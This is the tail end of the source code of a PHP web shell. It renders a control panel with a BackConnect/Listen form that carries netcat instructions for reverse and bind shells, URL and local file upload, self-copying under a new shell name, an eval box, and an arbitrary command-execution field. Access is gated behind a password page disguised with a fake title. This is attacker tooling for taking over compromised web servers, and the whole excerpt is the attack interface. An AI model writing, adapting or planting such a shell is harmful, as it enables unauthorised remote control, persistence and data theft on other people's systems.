<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">
<table class=\"tblBox\" style=\"width:100%;\">
<input type=\"hidden\" name=\"dir\" value=\"".$xCwd."\" />
<tr><td style=\"width:130px;\">BackConnect</td><td style=\"width:200px;\">
Port&nbsp;<input maxlength=\"5\" id=\"backC\" onkeyup=\"updateInfo('backC',0);\" style=\"width:60px;\" type=\"text\" name=\"bportC\" value=\"".$bportC."\" />
<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnConnect\" value=\"Connect\" />
</td>
<td><span id=\"backC_\" class=\"msgcon\">example: (using netcat) run &quot;nc -l -p ".$bportC."&quot; and then press Connect</span></td>
</tr>
<tr><td>Listen</td><td>
Port&nbsp;<input maxlength=\"5\" id=\"listenC\" onkeyup=\"updateInfo('listenC',1);\" style=\"width:60px;\" type=\"text\" name=\"lportC\" value=\"".$lportC."\" />
<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnListen\" value=\"Listen\" />
</td>
<td><span id=\"listenC_\" class=\"msgcon\">example: (using netcat) press &quot;Listen&quot; and then run &quot;nc ".$xServerIP." ".$lportC."&quot;</span></td>
</tr>
</table>
</form>
</div>
<div class=\"hidden\" id=\"newfolder\">
<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">
<input type=\"hidden\" name=\"dir\" value=\"".$xCwd."\" />
<table class=\"tblBox\" style=\"width:560px;\">
<tr><td style=\"width:120px;\">New Foldername</td><td style=\"width:304px;\">
<input style=\"width:300px;\" type=\"text\" name=\"foldername\" value=\"newfolder\" />
</td><td>
<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewfolder\" value=\"Create\" />
</td></tr>
</table>
</form>
</div>
<div class=\"hidden\" id=\"newfile\">
<form action=\"?\" method=\"get\" style=\"display:inline;margin:0;padding:0;\">
<input type=\"hidden\" name=\"dir\" value=\"".$xCwd."\" />
<table class=\"tblBox\" style=\"width:560px;\">
<tr><td style=\"width:120px;\">New Filename</td><td style=\"width:304px;\">
<input style=\"width:300px;\" type=\"text\" name=\"filename\" value=\"newfile\" />
</td><td>
<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewfile\" value=\"Create\" />
</td></tr>
</form>
</table>
</div>
<div class=\"hidden\" id=\"newupload\">
<form method=\"post\" action=\"?dir=".$xCwd."\" enctype=\"multipart/form-data\" style=\"display:inline;margin:0;padding:0;\">
<table class=\"tblBox\" style=\"width:560px;\">
<tr><td style=\"width:120px;\">Save as</td><td><input style=\"width:300px;\" type=\"text\" name=\"filename\" value=\"\" /></td></tr>
<tr><td style=\"width:120px;\">From Url</td><td style=\"width:304px;\">
<input style=\"width:300px;\" type=\"text\" name=\"fileurl\" value=\"\" />
</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewUploadUrl\" value=\"Get\" /></td></tr>
<tr><td style=\"width:120px;\">From Computer</td><td style=\"width:304px;\">
<input style=\"width:300px;\" type=\"file\" name=\"filelocal\" />
</td><td>
<input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewUploadLocal\" value=\"Get\" />
</td></tr>
</table>
</form>
</div>
<div class=\"hidden\" id=\"newchild\">
<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">
<input type=\"hidden\" name=\"dir\" value=\"".$xCwd."\" />
<table class=\"tblBox\" style=\"width:560px;\">
<tr><td style=\"width:120px;\">New Shellname</td><td style=\"width:304px;\">
<input style=\"width:300px;\" type=\"text\" name=\"childname\" value=\"".$shell_name.".php\"; />
</td><td><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnNewchild\" value=\"Create\" />
</td></tr>
</table>
</form>
</div>
<div class=\"hidden\" id=\"div_eval\">
<form method=\"get\" action=\"?\" style=\"display:inline;margin:0;padding:0;\">
<input type=\"hidden\" name=\"dir\" value=\"".$xCwd."\" />
<table class=\"tblBox\" style=\"width:560px;\">
<tr><td>
<textarea name=\"eval\" style=\"width:100%;height:100px;\"></textarea>
</td></tr><tr>
<td style=\"text-align:right;\"><input style=\"width:100px;\" type=\"submit\" class=\"btn\" name=\"btnEval\" value=\"Eval\" /></td></tr>
</table>
</form>
</div>
<div class=\"bottomwrapper\">
<div class=\"cmdbox\">
<form action=\"?\" method=\"get\">
<input type=\"hidden\" name=\"dir\" value=\"".$xCwd."\" />
<table style=\"width:100%;\"><tr>
<td style=\"width:88%;\"><input type=\"text\" id=\"cmd\" name=\"cmd\" value=\"\" style=\"width:100%;\" /></td>
<td style=\"width:10%;\"><input type=\"submit\" class=\"btn\" name=\"btnCommand\" style=\"width:120px;\" value=\"Execute\" /></td></tr></table>
</form>
</div>
<div class=\"result\" id=\"result\">
".$result."
</div></div></div></div>
";
}
else {
	$html_title = $shell_fake_name;
	$html_head = "<title>".$html_title."</title>".$shell_style;
	$html_body = "<div style=\"margin:30px;\">
<div>
<form action=\"?\" method=\"post\">
<input id=\"cmd\" type=\"text\" name=\"passw\" value=\"\" />
<input type=\"submit\" name=\"btnpasswd\" value=\"Ok\" />
</form>
</div>
<div style=\"font-size:10px;\">".$shell_fake_name."</div>
</div>
";
}
if(isset($_GET['cmd']) || isset($_POST['passw'])) $html_onload = "onload=\"document.getElementById('cmd').focus();\"";
else $html_onload = "";
$html_final = "<html>
<head>
".$html_head."
</head>
<body ".$html_onload.">
<div id=\"mainwrapper\">
".$html_body."
</div>
</body>
</html>";
echo preg_replace("/\s+/"," ",$html_final);
?>